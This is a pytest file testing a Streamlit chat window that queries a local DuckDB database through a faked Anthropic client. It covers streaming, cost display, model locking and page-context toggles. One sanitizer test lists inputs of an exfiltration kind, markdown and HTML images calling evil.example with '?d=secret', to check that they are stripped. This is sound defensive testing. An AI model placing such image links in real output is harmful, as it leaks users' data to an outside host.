"""The Ask window: the drawer's contents drawn by AppTest, with a FakeAnthropic: no network and no key."""

import subprocess
import sys

import pytest
from streamlit.testing.v1 import AppTest

from duckkit.app import ask_window, common
from duckkit.app.ask_window import clean
from duckkit.snapshot import contract_snapshot
from duckkit.testing import FakeAnthropic, chat_reply

QUERY = ("run_sql", {"query": "SELECT kind, count(*) AS items FROM v_items GROUP BY kind ORDER BY kind"})


@pytest.fixture
def fake(closed_db, spec, monkeypatch):
    """Point the window at the test database, and at a FakeAnthropic: add its replies with `fake.replies += [...]`."""
    snapshot = contract_snapshot(spec)
    monkeypatch.setattr(common, "con", lambda _spec: snapshot.cursor())
    client = FakeAnthropic()
    monkeypatch.setattr(ask_window, "new_client", lambda _spec: client)
    return client


def window_page(spec, context=None):
    def script(spec, context):
        from duckkit.app import ask_window

        if context:
            ask_window.ask_context(context)
        ask_window.window(spec, "Data to 3 Nov 2026")

    return AppTest.from_function(script, kwargs={"spec": spec, "context": context}, default_timeout=10)


def ask(at: AppTest, question: str) -> AppTest:
    at.chat_input(key="ask-question").set_value(question).run()
    assert not at.exception, at.exception
    return at


def texts(at: AppTest) -> str:
    return "\n".join([m.value for m in at.markdown] + [c.value for c in at.caption] + [w.value for w in at.warning]
                     + [i.value for i in at.info] + [c.value for c in at.code])


@pytest.mark.parametrize("text, cleaned", [
    ("See ![chart](https://evil.example/?d=secret) here", "See chart here"),
    ("![a] [1]\n\n[1]: https://evil.example/?d=secret", "a\n\n"),
    ("A <img src='https://evil.example/x.png'> tag", "A  tag"),
    ("<div onclick='x'>Hi</div>", "Hi"),
    ("Fruit cost $4 and veg $5", "Fruit cost \\$4 and veg \\$5"),
    ("Already \\$4", "Already \\$4"),
    ("Fresh is 2 < 3 and 5 > 4, see [the docs](https://docs.example)", "Fresh is 2 < 3 and 5 > 4, see [the docs](https://docs.example)"),
])
def test_an_answer_loses_its_images_and_html(text, cleaned):
    assert clean(text) == cleaned


def test_a_question_streams_an_answer_with_its_rows_queries_and_cost(fake, spec, capsys):
    fake.replies += [chat_reply(progress="Counting the items.", tools=(QUERY,)),
                     chat_reply("Fruit has **2** items.", input_tokens=3000, cache_read=40000, output_tokens=300)]
    at = ask(window_page(spec).run(), "How many items of each kind?")
    shown = texts(at)
    assert "Fruit has **2** items." in shown
    assert QUERY[1]["query"] in shown and "Returned 2 rows." in shown
    assert at.expander[-1].label == "Queries (1)"
    assert at.dataframe[0].value.to_dict("list") == {"kind": ["fruit", "veg"], "items": [2, 1]}
    cost = next(c.value for c in at.caption if c.value.startswith("This answer"))
    assert "conversation ≈ \\$0.03" in cost and "Opus 5.5" in cost and "\\$0.03 (44,000 in / 500 out)" in cost
    assert "ask: model=claude-opus-5-5 input_tokens=44000 output_tokens=500 cost=$0.0340" in capsys.readouterr().out
    assert "How many" not in capsys.readouterr().out  # the log has no question text


def test_the_data_line_says_what_the_chat_reads(fake, spec, monkeypatch):
    at = window_page(spec).run()
    assert "Reads the local database · Data to 3 Nov 2026" in texts(at)
    monkeypatch.setattr(spec, "db_path", spec.data_dir / "demo.duckdb")
    assert ask_window.where(spec) == "the demo database: its data is made up"
    monkeypatch.setattr(spec, "app_db", "md:shop")
    assert ask_window.where(spec) == "the published copy (md:shop)"


def test_without_a_key_the_window_says_how_to_set_one(closed_db, spec):
    at = window_page(spec).run()
    assert not at.exception
    assert "no Anthropic API key: set [anthropic] api_key in config.toml" in at.info[0].value
    assert not at.chat_input


@pytest.mark.parametrize("reply, message", [
    (chat_reply(stop_reason="refusal"), "the request was declined"),
    (chat_reply("Half an ans", stop_reason="max_tokens"), "the answer was cut off"),
])
def test_a_failed_answer_shows_why_and_the_conversation_goes_on(fake, spec, reply, message):
    fake.replies += [reply, chat_reply("Three items.")]
    at = ask(window_page(spec).run(), "How many?")
    assert message in at.warning[0].value
    at = ask(at, "How many items?")
    assert "Three items." in texts(at)
    assert [m["role"] for m in fake.requests[-1]["messages"]] == ["user"]  # the failed turn left nothing behind


def test_the_page_summary_goes_with_the_question_while_the_toggle_is_on(fake, spec):
    fake.replies += [chat_reply("High because of fruit."), chat_reply("No idea.")]
    at = ask(window_page(spec, "Page: Dashboard. Period: October.").run(), "Why so high?")
    first = fake.requests[0]
    assert first["messages"][0]["content"][0]["text"] == "What the user is looking at:\nPage: Dashboard. Period: October."
    assert "October" not in str(first["system"])
    at.toggle(key=ask_window.INCLUDE).set_value(False).run()
    assert "Claude doesn't see the page" in texts(at)
    at = ask(at, "And now?")
    assert [b["text"] for b in fake.requests[1]["messages"][-1]["content"]] == ["And now?"]
    assert fake.requests[1]["system"] == first["system"]
    assert "without the page" in texts(at)


def test_a_page_with_no_summary_is_named(fake, spec):
    fake.replies += [chat_reply("Two kinds.")]
    at = window_page(spec).run()
    assert "Claude has no view of this page" in texts(at)
    ask(at, "How many kinds?")
    assert [b["text"] for b in fake.requests[0]["messages"][0]["content"]] == ["How many kinds?"]


def test_another_pages_summary_is_not_this_ones(fake, spec):
    def script(spec):
        import streamlit as st

        from duckkit.app import ask_window

        st.session_state[ask_window.CONTEXT] = ("another page", "Page: Trends.")
        ask_window.window(spec)

    at = AppTest.from_function(script, kwargs={"spec": spec}).run()
    assert "Claude has no view of this page" in texts(at)


def test_the_model_locks_after_the_first_question_and_a_new_conversation_frees_it(fake, spec):
    fake.replies += [chat_reply("One."), chat_reply("Two.")]
    at = window_page(spec).run()
    at.button_group(key=ask_window.PICKER).set_value("claude-sonnet-5-5").run()
    at = ask(at, "First?")
    assert fake.requests[0]["model"] == "claude-sonnet-5-5"
    assert at.button_group(key=ask_window.PICKER).disabled
    assert "Sonnet 5.5" in texts(at)
    at.button[0].click().run()  # New conversation
    assert "One." not in texts(at) and not at.button_group(key=ask_window.PICKER).disabled
    ask(at, "Second?")
    assert fake.requests[1]["model"] == "claude-sonnet-5-5" and len(fake.requests[1]["messages"]) == 1


def test_the_default_model_and_effort_come_from_config(fake, spec):
    spec.config_path.write_text('[anthropic]\nmodel = "claude-sonnet-5-5"\neffort = "low"\n')
    fake.replies += [chat_reply("One.")]
    ask(window_page(spec).run(), "First?")
    assert fake.requests[0]["model"] == "claude-sonnet-5-5"
    assert fake.requests[0]["output_config"] == {"effort": "low"}
    spec.config_path.write_text('[anthropic]\nmodel = "gpt"\n')
    assert ask_window.default_model(spec) == "claude-opus-5-5"


def test_the_notes_next_to_main_go_in_the_system_prompt(fake, spec):
    app = spec.main_script().parent
    app.mkdir(parents=True)
    (app / ask_window.NOTES_FILE).write_text("Prices are in pounds.\n")
    fake.replies += [chat_reply("One.")]
    ask(window_page(spec).run(), "First?")
    assert "Notes on reading the data:\nPrices are in pounds." in fake.requests[0]["system"][0]["text"]


def test_an_answer_that_stopped_says_so(fake, spec):
    def script(spec):

        from duckkit.app import ask_window

        conv = ask_window.conversation(spec)
        if not conv.turns:
            conv.turns.append(ask_window.Turn("Why?", text="Because"))
        ask_window.window(spec)

    at = AppTest.from_function(script, kwargs={"spec": spec}).run()
    assert "stopped before its end" in at.warning[0].value


def test_the_button_opens_the_drawer(fake, spec):
    def script(spec):
        from duckkit.app import common

        common.sidebar(spec)

    spec.ask = True
    at = AppTest.from_function(script, kwargs={"spec": spec}).run()
    assert not at.exception
    at.button(key="ui-ask-button").click().run()
    assert "Reads the local database" in texts(at)


def test_without_the_option_there_is_no_button_and_no_anthropic(closed_db, spec):
    """In a process of its own: the tests import anthropic."""
    code = f"""
import sys
from streamlit.testing.v1 import AppTest
from pathlib import Path
from duckkit import AppEntry, AppSpec
from tests.conftest import make_contract

def script(spec):
    from duckkit.app import common
    common.sidebar(spec)

spec = AppSpec(package="shop", root=Path({str(spec.root)!r}), contract=make_contract(), apps=[AppEntry("app", port=8600)])
at = AppTest.from_function(script, kwargs={{"spec": spec}}).run()
assert not at.exception, at.exception
assert not [b for b in at.button if b.key == "ui-ask-button"]
loaded = [m for m in sys.modules if m.startswith("anthropic") or m == "duckkit.app.ask_window"]
assert not loaded, loaded
"""
    subprocess.run([sys.executable, "-c", code], check=True, cwd=ask_window.__file__.split("/src/")[0])
